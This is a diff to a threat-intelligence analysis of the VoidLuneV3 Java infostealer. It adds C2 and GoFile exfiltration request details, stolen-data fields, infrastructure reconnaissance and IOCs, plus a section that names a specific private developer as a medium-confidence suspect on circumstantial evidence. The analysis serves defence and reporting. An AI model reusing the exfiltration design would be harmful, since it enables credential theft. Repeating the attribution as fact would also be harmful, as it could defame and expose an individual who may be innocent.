@@ -23,7 +23,9 @@
 11. [Anti-Analysis Techniques](#anti-analysis-techniques)
 12. [IOCs](#iocs)
 13. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
-14. [Source Files](#source-files)
+14. [C2 Infrastructure — Deep Dive](#c2-infrastructure--deep-dive)
+15. [Developer Attribution](#developer-attribution)
+16. [Source Files](#source-files)
 
 ---
 
@@ -261,7 +263,7 @@ VoidLuneV3 Capabilities
 
 | Role | Endpoint | Protocol |
 |------|----------|----------|
-| **Primary C2** | `https://swordfull.com/m/` | HTTPS POST (Java 11 HttpClient) |
+| **Primary C2** | `https://swordfull.com/m/` | HTTPS/2 POST (Java 17 HttpClient) |
 | **Exfil staging** | `https://upload.gofile.io/uploadfile` | HTTPS multipart POST |
 
 **User-Agent (spoofed):**
@@ -271,27 +273,130 @@ Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
 
 ### Exfiltration Flow Detail
 
+The pipeline uses **dual-endpoint parallel dispatch** — every send fires two concurrent `CompletableFuture.runAsync()` tasks simultaneously. If either endpoint is unavailable, the other still receives the stolen data:
+
 ```
-Step 1: Pack all stolen data into in-memory ZIP
+Step 1: Stolen data cached to local SQLite database (sqlite-jdbc 3.45.3.0)
+        Allows retry on network failure without re-stealing data
+
+Step 2: Pack all stolen data into in-memory ZIP
         a.b.c.z: ZipOutputStream -> ByteArrayOutputStream
 
-Step 2: Multipart POST to GoFile
-        POST https://upload.gofile.io/uploadfile
-        Content-Type: multipart/form-data
-        Body: [ZIP file bytes]
-        Response: {"status":"ok","data":{"downloadPage":"https://gofile.io/d/XXXX",...}}
+Step 3a [Thread 1]: Multipart POST to GoFile
+         POST https://upload.gofile.io/uploadfile
+         Content-Type: multipart/form-data; boundary=<random UUID>
+         Body: [ZIP file bytes]
+         Response: {"status":"ok","data":{"downloadPage":"https://gofile.io/d/XXXX",...}}
 
-Step 3: Extract download URL from GoFile response
+Step 3b [Thread 2]: POST metadata + GoFile link to C2 (runs concurrently)
+         POST https://swordfull.com/m/
+         Content-Type: multipart/form-data; boundary=<random UUID>
+         User-Agent: <Chrome 121 UA>
+         Body: license token + victim data fields (Gson-serialized JSON)
 
-Step 4: POST metadata to attacker C2
-        POST https://swordfull.com/m/
-        Body: { download_url, hostname, username, discord_badges, ... }
+Step 4: CompletableFuture.allOf() waits for both threads with timeout
+        Retry: 3 attempts with exponential backoff (Thread.sleep)
+        Rate-limit: HTTP 429 triggers additional sleep
 ```
 
-> **Why GoFile?** All sensitive victim data travels over `upload.gofile.io` — a trusted, legitimate CDN. Network monitoring tools see a standard file upload. Only a small metadata beacon goes to the actual C2 domain, making detection significantly harder.
+> **Resilience design:** The dual-endpoint model means takedown of `swordfull.com` does NOT stop exfiltration — stolen ZIPs continue reaching the attacker via GoFile. Only a small metadata beacon goes to the C2 domain; actual credential data travels via GoFile's trusted CDN, making network-layer detection significantly harder.
 
-**Source class:** `a.b.c.x` (field `U = "https://swordfull.com/m/"`)
-**Exfil class:** `a.b.e.gf` (field `w = "https://upload.gofile.io/uploadfile"`)
+**Source class:** `a.b.c.x` (field `U` — C2 URL loaded from JAR resource `a/b/c/license.txt`)
+**Exfil class:** `a.b.e.gf` (GoFile upload handler)
+
+### Per-Build Authentication Token
+
+Each compiled build embeds a unique token in the JAR at `a/b/c/license.txt`, read at runtime via `Class.getResourceAsStream()`:
+
+```
+Observed token: license-20260326220248-ce21
+Format:         license-<YYYYMMDDHHMMSS>-<4hex>
+Decoded date:   2026-03-26 22:02:48 UTC
+                (24 days after domain registration 2026-03-02)
+```
+
+The token serves as a per-campaign identifier — different victim builds likely carry different tokens, allowing the operator to attribute each submission to a specific distribution channel.
+
+### C2 API Methods (Reconstructed from Bytecode)
+
+Four distinct API operations were identified from full disassembly of `a.b.c.x`:
+
+| Method | Purpose | Key Payload Fields |
+|--------|---------|-------------------|
+| `a1b()` | Discord profile + token dump | license, os.name, USERNAME env, hostname, Discord token (k1y), username (u2n), discriminator (d3s), user ID (i4d), badge string, Nitro type (c9t), email (e6m), phone (p7h), booster status (o0b), stolen tokens list (s1v), gift data (g1t), avatar URL, friend list batched ~285/request, totalFriends |
+| `c2d(String)` | Crypto wallet data exfil | license, system ID, wallet extension data via `a.b.e.r.s5m()`, encryption key via `a.b.c.k.f1n()` |
+| `e3f(byte[], String)` | Binary ZIP upload | Raw byte array as multipart attachment, filename, system ID, encryption key |
+| `g4h(...)` | General structured report | 3 string fields, integer counter, boolean isLast flag; increments `a.b.d.dec.V` success counter |
+
+All methods serialize with **Gson 2.10.1** then route through the dual-endpoint `k()` dispatcher.
+
+---
+
+## C2 Infrastructure — Deep Dive
+
+This section documents live infrastructure reconnaissance conducted as part of this analysis.
+
+### Domain Registration
+
+| Field | Value |
+|-------|-------|
+| Registered | 2026-03-02T22:18:26Z |
+| Expires | 2027-03-02T22:18:26Z |
+| Registrar | Turkticaret.net Yazilim Hizmetleri (IANA ID: 819) |
+| Registrant Country | **TR (Turkey)** — leaked despite GDPR masking |
+| Name Servers | `peaches.ns.cloudflare.com` / `stan.ns.cloudflare.com` |
+| Domain Status | `clientTransferProhibited` |
+| DNSSEC | Unsigned |
+
+Domain was registered **24 days before the JAR build date** — consistent with deliberate campaign infrastructure preparation.
+
+### DNS Records
+
+| Record | Name | Value | Notes |
+|--------|------|-------|-------|
+| A | root | NONE | Cloudflare orange-cloud; origin IP hidden |
+| A | www | 104.21.21.143, 172.67.199.30 | Cloudflare edge, Dallas (DFW) PoP |
+| A | m. | NXDOMAIN | C2 path is on root domain, not a subdomain |
+| A | api. | NXDOMAIN | No API subdomain exists |
+| NS | @ | peaches.ns.cloudflare.com, stan.ns.cloudflare.com | |
+| SOA serial | @ | 2406953209 | |
+
+### TLS Certificate
+
+```
+Issuer:     Let's Encrypt E8
+Not Before: 2026-04-30 22:14:57 UTC  (58 days post-registration)
+Not After:  2026-07-29 22:14:56 UTC
+Subject:    CN=swordfull.com
+SANs:       swordfull.com, *.swordfull.com
+Key type:   EC/prime256v1 (256-bit)
+```
+
+Certificate was issued 58 days after registration — consistent with staged infrastructure build-out.
+
+### Live HTTP Response Map
+
+| Path | Method | HTTP Response | Interpretation |
+|------|--------|---------------|----------------|
+| `/` | GET | **530** error 1016 | Origin server unreachable |
+| `/m/` | GET | **403** "Suspected Malware" | Cloudflare WAF active block |
+| `/m/` | POST | **403** "Suspected Malware" | WAF block applies to all methods |
+| `/m/<license>` | GET | **530** error 1016 | Origin DNS fails on subpaths |
+| `/m/api/` | GET | **530** error 1016 | Origin DNS fails on subpaths |
+| `www/` | GET | **403** error 1016 | www backend currently dead |
+
+**Critical distinction:** `/m/` returns 403 (WAF block) while all other paths return 530 (origin unreachable). Cloudflare IS proxying `/m/` to a live origin — it is blocked at the WAF layer only. Victims connecting from unblocked residential IP ranges may still be reaching the origin server.
+
+### Cloudflare Threat Intelligence Status
+
+`swordfull.com` has been **independently flagged by Cloudflare** as "Suspected Malware" as of 2026-06-22:
+
+- **Block reason:** "This website has been reported for potentially distributing malware"
+- **Challenge:** Cloudflare Turnstile CAPTCHA (sitekey `0x4AAAAAABDaGKKSGLylJZFA`)
+- **Bypass path:** `/cdn-cgi/phish-bypass?atok=<token>&original_path=/m/`
+- **NEL telemetry:** All access attempts reported to `a.nel.cloudflare.com/report/v4`
+
+The Network Error Logging endpoint means Cloudflare is collecting metadata on every connection attempt to this domain, which may be available to law enforcement via legal process.
 
 ---
 
@@ -494,13 +599,32 @@ Checks display adapter device name:
 ### Network
 
 ```
-swordfull.com                    [C2 — BLOCK]
-upload.gofile.io                 [Exfil staging — legitimate service abused]
+# Domains — BLOCK/MONITOR
+swordfull.com                              [Primary C2 — BLOCK]
+upload.gofile.io                           [Exfil staging — monitor (legitimate service abused)]
+gofile.io                                  [Attacker retrieves stolen ZIPs via this domain]
 
-POST https://swordfull.com/m/
-POST https://upload.gofile.io/uploadfile
+# C2 Request URLs
+POST https://swordfull.com/m/              [Victim metadata beacon]
+POST https://upload.gofile.io/uploadfile   [Credential ZIP upload]
 
+# HTTP Indicators
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+Content-Type: multipart/form-data          [boundary = random UUID per request]
+HTTP version: HTTP/2
+
+# DNS
+swordfull.com NS: peaches.ns.cloudflare.com, stan.ns.cloudflare.com
+swordfull.com www A: 104.21.21.143         [Cloudflare edge, Dallas PoP]
+swordfull.com www A: 172.67.199.30         [Cloudflare edge, Dallas PoP]
+
+# Domain Registration
+Registrar: Turkticaret.net Yazilim Hizmetleri (IANA ID: 819)
+Registrant country: TR (Turkey)
+Registered: 2026-03-02
+
+# Per-build auth token (embedded in JAR at a/b/c/license.txt)
+license-20260326220248-ce21                [Build 2026-03-26; format: license-<YYYYMMDDHHMMSS>-<4hex>]
 ```
 
 ### File System
@@ -521,13 +645,26 @@ Parent Electron process exits immediately after spawn
 ### Strings (plaintext — survives obfuscation removal)
 
 ```
+# Malware identity
 VoidLuneV3
 salams.jar
 javam.exe
 ZKM26.0.2
+
+# C2 infrastructure
 swordfull.com
 https://swordfull.com/m/
 https://upload.gofile.io/uploadfile
+
+# Maven build metadata (NOT obfuscated — developer identifier)
+com.mirac
+private-project
+1.0-SNAPSHOT
+
+# Per-build auth token (JAR path: a/b/c/license.txt)
+license-20260326220248-ce21
+
+# Encoding
 ISO-8859-1
 ```
 
@@ -561,6 +698,82 @@ dQw4w9WgXcQ:([^"\s]*)
 | T1057 | Process Discovery | CreateToolhelp32Snapshot + lsass.exe targeting |
 | T1083 | File and Directory Discovery | Wallet paths + Desktop .txt enumeration |
 | T1480 | Execution Guardrails | Mutex + single-instance enforcement |
+
+---
+
+## Developer Attribution
+
+> **Disclaimer:** The following attribution is based on circumstantial technical evidence and does not constitute a confirmed legal identification. Definitive attribution requires corroboration from GitHub, registrar, or Cloudflare records obtained via appropriate legal process.
+
+### Maven Build Metadata (Extracted from salams.jar)
+
+The JAR contains Maven POM metadata that was **not obfuscated** by Zelix KlassMaster:
+
+```xml
+<!-- META-INF/maven/com.mirac/private-project/pom.xml -->
+<groupId>com.mirac</groupId>
+<artifactId>private-project</artifactId>
+<version>1.0-SNAPSHOT</version>
+<maven.compiler.source>17</maven.compiler.source>
+<maven.compiler.target>17</maven.compiler.target>
+```
+
+Build configuration:
+- Tool: `maven-assembly-plugin 3.7.1` (jar-with-dependencies)
+- Compiler: `maven-compiler-plugin 3.13.0`
+- Target: Java 17
+- Entry point: `a.Main`
+
+In Maven convention, `groupId` typically reflects the developer's domain or username. `com.mirac` directly mirrors the GitHub username `mirac`.
+
+### Bundled Dependencies (pom.xml)
+
+| Library | Version | Role in Malware |
+|---------|---------|-----------------|
+| `org.xerial:sqlite-jdbc` | 3.45.3.0 | Local credential database before exfil |
+| `com.google.code.gson:gson` | 2.10.1 | JSON serialization for C2 protocol |
+| `net.java.dev.jna:jna` | 5.14.0 | Native Win32 API (DPAPI, NCrypt, TlHelp32) |
+| `net.java.dev.jna:jna-platform` | 5.14.0 | Crypt32Util, WinNT, WinDef wrappers |
+
+### GitHub Attribution Lead
+
+A GitHub account matching the Maven groupId was identified with corroborating indicators:
+
+| Field | Value |
+|-------|-------|
+| Handle | `mirac` |
+| Full name | Miraç Satıç |
+| Location | **Ankara, Turkey** |
+| Company | Connect ION Tech. Co. |
+| Personal site | mirac.me |
+| Bio | *"Software Developer — Areas: Java/Spring, Go, NodeJS, GIT, TFS, Maven, GNU/Linux"* |
+| Account created | 2011-01-22 (15-year established account) |
+| Public repos | 32 |
+| Last repo activity | **2026-03-16** |
+
+### Correlation Matrix
+
+| Indicator | Evidence | Confidence |
+|-----------|----------|------------|
+| Maven groupId `com.mirac` matches GitHub handle `mirac` | Exact string match | HIGH |
+| Bio lists Java + Maven as primary stack | Exact technology stack match | HIGH |
+| Location: Ankara, Turkey | Matches leaked WHOIS registrant country TR | MEDIUM |
+| GitHub last active 2026-03-16 | 10 days before JAR build date 2026-03-26 | MEDIUM |
+| Domain registered 2026-03-02 | 14 days before last GitHub activity | MEDIUM |
+| Account age 15 years | Established developer identity, not a throwaway | LOW |
+
+**Overall attribution confidence: MEDIUM**
+
+A second Turkish developer (`mrKodat` / Miraç Kodat, Istanbul, IWWOMI) shares the given name but works in an incompatible stack (Vue/Dart/Flutter). Assessed **LOW confidence**.
+
+### Recommended Reporting Contacts
+
+| Organisation | Purpose | Contact |
+|---|---|---|
+| Cloudflare | Hosting/WAF provider; holds NEL telemetry logs | abuse@cloudflare.com |
+| Turkticaret.net | Domain registrar; holds registrant identity | abuse@turkticaret.net / +90.2242248640 |
+| GoFile | Secondary exfil service; holds stolen victim ZIPs | abuse@gofile.io |
+| GitHub | Developer account host | github.com/contact/abuse |
 
 ---
 
